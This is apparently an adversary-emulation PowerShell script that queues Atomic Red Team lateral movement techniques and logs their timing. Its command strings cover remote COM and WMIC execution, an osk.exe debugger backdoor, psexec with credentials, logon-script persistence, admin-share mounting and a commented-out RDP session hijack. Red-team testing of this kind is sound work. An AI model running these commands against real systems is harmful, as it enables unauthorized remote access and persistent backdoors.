<# 

The commands in this script include atomic red team TTPs. This script is meant to automate execution of TTPs as well as make it reproducible 
along with generating a log file that notes down the time at which it was executed.parameters can be replaced with appropriate binaries suitable for yor
environment 

#>

$currentdir = $(pwd).Path
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 

$LATERALLOGO=
'
############################################################################################################################################################################################################### 
#                                                                                                                                                                                                              #    
#                                                                                         LATERAL MOVEMENT                                                                                                     #
#                                                                                                                                                                                                              #
################################################################################################################################################################################################################
'

Write-Host $LATERALLOGO


$T1028_user = "username"
$T1028_pass = "password"
$T1028_remote_command = "ipconfig"
$T1028_node = "janedoe-pc"

$T1028 = '
powershell Enable-PSRemoting -Force
powershell.exe [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.application","'+ $T1028_node +'")).Documnet.ActiveView.ExecuteShellCommand("c:\windows\system32\calc.exe", $null, $null, "7")
wmic /user:'+ $T1028_user +' /password:'+ $T1028_pass +' /node:'+ $T1028_node +' process call create "C:\Windows\system32\reg.exe add \"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe\" /v \"Debugger\" /t REG_SZ /d \"cmd.exe\" /f"
psexec \\host -u domain\'+ $T1028_user +' -p '+ $T1028_pass +' -s cmd.exe
invoke-command -computer_name '+ $T1028_node +' -scriptblock {'+ $T1028_remote_command +'}
'

$T1037 = '
REG.exe ADD HKCU\Environment /v UserInitMprLogonScript /t REG_MULTI_SZ /d "'+ $T1028_remote_command +'"
'

<#
$T1076 ='
query user
sc.exe create sesshijack binpath= "cmd.exe /k tscon 1337 /dest:rdp-tcp#55"
net start sesshijack
sc.exe delete sesshijack
'
#>

$T1077_map = "g"
$T1077_share = "C$"

$T1077 = '
cmd.exe /c "net use \\'+ $T1028_node +'\'+ $T1077_share +' ' + $T1028_pass + ' /u:'+ $T1028_user +'"
New-PSDrive -name '+ $T1077_map +' -psprovider filesystem -root \\'+ $T1028_node +'\'+ $T1077_share +'
'

[array]$lateral_movement_TTP_number = "T1028", "T1037", "T1077"
[array]$lateral_movement = $T1028, $T1037, $T1077


for ($i=0; $i -lt $lateral_movement.length; $i++){

    Write-Host Exeucting $lateral_movement_TTP_number[$i] -ForegroundColor Red `n
    Write-Host $lateral_movement[$i] -ForegroundColor green `n
    Write-Host Time : $(Get-Date) -ForegroundColor Cyan `n
    Write-Host -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    Get-Date | Add-Content log-lateral-movement.txt 
    "                         " | Add-Content log-lateral-movement.txt
    $lateral_movement_TTP_number[$i]+ " : " + $lateral_movement[$i] | Add-Content log-lateral-movement.txt
    "                         " | Add-Content log.txt
    <# Invoke-Expression $lateral_movement[$i] #>
    "---------------------------------------------------------------------------------------------------------------------------" | Add-Content log-lateral-movement.txt 
} 
